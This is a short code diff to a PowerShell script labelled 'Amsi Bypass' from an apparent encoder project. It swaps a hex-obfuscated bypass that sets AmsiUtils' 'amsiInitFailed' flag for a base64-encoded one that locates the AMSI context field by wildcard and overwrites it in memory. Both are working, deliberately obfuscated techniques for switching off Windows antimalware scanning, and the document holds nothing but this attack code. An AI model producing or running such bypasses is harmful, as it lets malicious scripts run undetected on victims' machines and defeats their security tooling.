@@ -1,7 +1,2 @@
 # https://github.com/Chainski/AES-Encoder | Amsi Bypass
-$ph5QZJmzF7SgZtFHqv5zDd9zawJFa9pnJRTiecvHoXJEN3YK74 = (-join ([regex]::Matches("53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73", '..') | ForEach-Object { [char]([convert]::ToUInt32($_.Value, 16)) }))
-$r9kSTo4wARdWCKkXKAbeeLTuxsuUhJRMZDny9rAHaxuCnxsmat = [Text.Encoding]::UTF8.GetString((0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64))
-$assembly = [Ref].Assembly
-$type = $assembly.GetType($ph5QZJmzF7SgZtFHqv5zDd9zawJFa9pnJRTiecvHoXJEN3YK74)
-$field = $type.GetField($r9kSTo4wARdWCKkXKAbeeLTuxsuUhJRMZDny9rAHaxuCnxsmat, 'NonPublic, Static')
-$field.SetValue($null, $true)
+([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("Zm9yZWFjaCgkaSBpbiBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlcygpKXtpZigkaS5OYW1lIC1saWtlICIqc2lVIisiKiIrImlscyIpeyR1dGlsRnVuY3Rpb25zPSRpLkdldEZpZWxkcygnTm9uUHVibGljLFN0YXRpYycpfX07CiRtb3JlY29kZT0iYXNkYWdnd3J3YWdyd3dlZmVhZ3dnIgpmb3JlYWNoKCRmdW5jIGluICR1dGlsRnVuY3Rpb25zKXtpZigkZnVuYy5OYW1lIC1saWtlICIqQ29udGV4dCIpeyRhZGRyPSRmdW5jLkdldFZhbHVlKCRudWxsKX19OwokZGVhZGMwZGU9NDUxMjM0MTIzNTEyMzE1MjM1NjMyMzQ1CltJbnRwdHJdJHBvaW50ZXI9JGFkZHI7CiRkZWFkYjMzZj0ic3RyaW5nMTIzNDIzNDUzMTIzNSIKW0ludDMyW11dJG51bGxCeXRlPUAoMCk7CltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJG51bGxCeXRlLDAsJHBvaW50ZXIsMSk7")))
